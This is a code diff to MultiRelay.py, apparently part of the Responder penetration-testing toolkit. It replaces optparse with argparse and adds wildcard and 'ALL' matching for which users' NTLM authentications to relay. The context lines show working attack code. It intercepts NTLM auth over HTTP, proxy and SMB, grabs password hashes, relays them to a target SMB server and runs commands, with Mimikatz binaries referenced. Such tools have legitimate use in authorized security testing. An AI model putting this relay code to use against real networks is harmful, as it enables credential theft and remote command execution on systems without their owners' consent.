@@ -18,10 +18,12 @@ import sys
 import re
 import os
 import logging
-import optparse
+import argparse
 import time
 import random
 import subprocess
+import itertools
+import fnmatch
 from threading import Thread
 from SocketServer import TCPServer, UDPServer, ThreadingMixIn, BaseRequestHandler
 try:
@@ -50,32 +52,21 @@ Mimikatzx86Filename = "./MultiRelay/bin/mimikatz_x86.exe"
 RunAsFileName       = "./MultiRelay/bin/Runas.exe"
 SysSVCFileName      = "./MultiRelay/bin/Syssvc.exe"
 
+parser = argparse.ArgumentParser()
 
-def UserCallBack(op, value, dmy, parser):
-    args=[]
-    for arg in parser.rargs:
-        if arg[0] != "-":
-            args.append(arg)
-        if arg[0] == "-":
-            break
-    if getattr(parser.values, op.dest):
-        args.extend(getattr(parser.values, op.dest))
-    setattr(parser.values, op.dest, args)
+parser.add_argument('-t',action="store", help="Target server for SMB relay. Can be used multiple times.",dest="Target")
+parser.add_argument('-p',action="store", help="Additional port to listen on, this will relay for proxy, http and webdav incoming packets.",metavar="8081",dest="ExtraPort")
+parser.add_argument('-u', '--UserToRelay', '--UsersToRelay', help="Users to relay. Use '-u ALL' to relay all users or wildcard to relay users like '*.admin.'. Usernames are case sensitive.", action='append',nargs='+',dest="UsersToRelay")
+parser.add_argument('-c', '--command', action="store", help="Single command to run (scripting)", metavar="whoami",dest="OneCommand")
+parser.add_argument('-d', '--dump', action="store_true", help="Dump hashes (scripting)", dest="Dump")
 
-parser = optparse.OptionParser(usage="\npython %prog -t 10.20.30.40 -u Administrator lgandx admin\npython %prog -t 10.20.30.40 -u ALL", version=__version__, prog=sys.argv[0])
-parser.add_option('-t',action="store", help="Target server for SMB relay.",metavar="10.20.30.45",dest="TARGET")
-parser.add_option('-p',action="store", help="Additional port to listen on, this will relay for proxy, http and webdav incoming packets.",metavar="8081",dest="ExtraPort")
-parser.add_option('-u', '--UserToRelay', help="Users to relay. Use '-u ALL' to relay all users.", action="callback", callback=UserCallBack, dest="UserToRelay")
-parser.add_option('-c', '--command', action="store", help="Single command to run (scripting)", metavar="whoami",dest="OneCommand")
-parser.add_option('-d', '--dump', action="store_true", help="Dump hashes (scripting)", metavar="whoami",dest="Dump")
+options  = parser.parse_args()
 
-options, args = parser.parse_args()
-
-if options.TARGET is None:
+if options.Target is None:
     print "\n-t Mandatory option is missing, please provide a target.\n"
     parser.print_help()
     exit(-1)
-if options.UserToRelay is None:
+if options.UsersToRelay is None:
     print "\n-u Mandatory option is missing, please provide a username to relay.\n"
     parser.print_help()
     exit(-1)
@@ -89,9 +80,11 @@ if not os.geteuid() == 0:
 OneCommand       = options.OneCommand
 Dump             = options.Dump
 ExtraPort        = options.ExtraPort
-UserToRelay      = options.UserToRelay
+UsersToRelay     = list(itertools.chain(*options.UsersToRelay))
+if 'ALL' in UsersToRelay:
+        UsersToRelay = ['*']
 
-Host             = [options.TARGET]
+Host             = [options.Target]
 Cmd              = []
 ShellOpen        = []
 Pivoting         = [2]
@@ -114,7 +107,7 @@ def ShowWelcome():
      print 'If you do so, use taskkill (as system) to kill the process.'
      print color('*/',8,1)
      print color('\nRelaying credentials for these users:',8,1)
-     print color(UserToRelay,4,1)
+     print color(UsersToRelay,4,1)
      print '\n'
 
 
@@ -262,7 +255,7 @@ class HTTPProxyRelay(BaseRequestHandler):
                         else:
                             #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
                             #and has not attempted before. While at it, let's grab his hash.
-                            Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host[0],Pivoting)
+                            Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UsersToRelay,Host[0],Pivoting)
 
                             if Username is not None:
                                 head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",uid=smbdata[32:34],mid="\x03\x00")
@@ -359,7 +352,7 @@ class HTTPRelay(BaseRequestHandler):
                         else:
                             #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
                             #and has not attempted before. While at it, let's grab his hash.
-                            Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host[0],Pivoting)
+                            Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UsersToRelay,Host[0],Pivoting)
 
                             if Username is not None:
                                 head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",uid=smbdata[32:34],mid="\x03\x00")
@@ -446,7 +439,7 @@ class SMBRelay(BaseRequestHandler):
             else:
                 #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
                 #and has not attempted before. While at it, let's grab his hash.
-                Username, Domain = ParseSMBHash(data,self.client_address[0],challenge,UserToRelay,Host[0],Pivoting)
+                Username, Domain = ParseSMBHash(data,self.client_address[0],challenge,UsersToRelay,Host[0],Pivoting)
                 if Username is not None:
                     ##Got the ntlm message 3, send it over to SMB.
                     head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",uid=smbdata[32:34],mid="\x03\x00")
